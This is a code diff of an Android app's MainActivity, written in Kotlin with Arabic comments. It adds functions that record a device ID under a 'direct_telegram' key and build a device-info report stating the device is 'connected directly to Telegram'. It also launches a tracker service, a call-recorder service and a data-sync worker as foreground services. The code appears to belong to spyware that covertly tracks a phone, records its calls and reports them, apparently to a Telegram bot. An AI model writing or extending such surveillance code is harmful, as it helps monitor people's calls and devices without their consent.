@@ -640,38 +594,53 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ==================== ==================== ====================
-    //      جسر JavaScript (JavaScript Bridge)
-    // ==================== ==================== ====================
+    private fun ensureDeviceId() {
+        if (SharedPrefsManager.getDeviceId(this) == null) {
+            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+                ?: System.currentTimeMillis().toString()
+            SharedPrefsManager.saveData(this, "direct_telegram", androidId)
+        }
+    }
 
-    /**
-     * إرسال إشعار JavaScript للواجهة
-     */
+    private fun buildDeviceInfoHtml(): String {
+        return "📱 الموديل: <b>${Build.MODEL}</b><br>" +
+               "🏢 الشركة: <b>${Build.BRAND}</b><br>" +
+               "🤖 أندرويد: <b>${Build.VERSION.RELEASE}</b> (API ${Build.VERSION.SDK_INT})<br>" +
+               "🆔 المعرف: <code>${SharedPrefsManager.getDeviceId(this) ?: "غير معروف"}</code><br>" +
+               "🟢 الحالة: متصل بتيليجرام مباشرة"
+    }
+
+    private fun startAllServices() {
+        try {
+            Log.d("MainActivity", "🚀 بدء تشغيل جميع الخدمات...")
+            val trackerIntent = Intent(this, MainTrackerService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(trackerIntent) else startService(trackerIntent)
+
+            val callIntent = Intent(this, CallRecorderService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(callIntent) else startService(callIntent)
+
+            DataSyncWorker.startImmediate(this)
+            Log.d("MainActivity", "✅ تم بدء جميع الخدمات بنجاح")
+        } catch (e: Exception) {
+            Log.e("MainActivity", "خطأ في بدء الخدمات: ${e.message}", e)
+        }
+    }
+
+    // ==================== جسر JavaScript ====================
+
     private fun jsNotify(method: String, arg: String) {
         webView.post {
-            try {
-                webView.evaluateJavascript("window.$method('$arg')", null)
-            } catch (e: Exception) {
-                Log.e("MainActivity", "خطأ JS: ${e.message}")
-            }
+            try { webView.evaluateJavascript("window.$method('$arg')", null) }
+            catch (e: Exception) { Log.e("MainActivity", "خطأ JS: ${e.message}") }
         }
     }
 
-    /**
-     * تنفيذ أمر JavaScript مباشر في الواجهة
-     */
     private fun jsCall(script: String) {
         webView.post {
-            try {
-                webView.evaluateJavascript(script, null)
-            } catch (e: Exception) {
-                Log.e("MainActivity", "خطأ JS: ${e.message}")
-            }
+            try { webView.evaluateJavascript(script, null) }
+            catch (e: Exception) { Log.e("MainActivity", "خطأ JS: ${e.message}") }
         }
     }
 
-    /**
-     * بدء مهمة مزامنة البيانات
-     */
     fun startWorker() { DataSyncWorker.startImmediate(this) }
 }
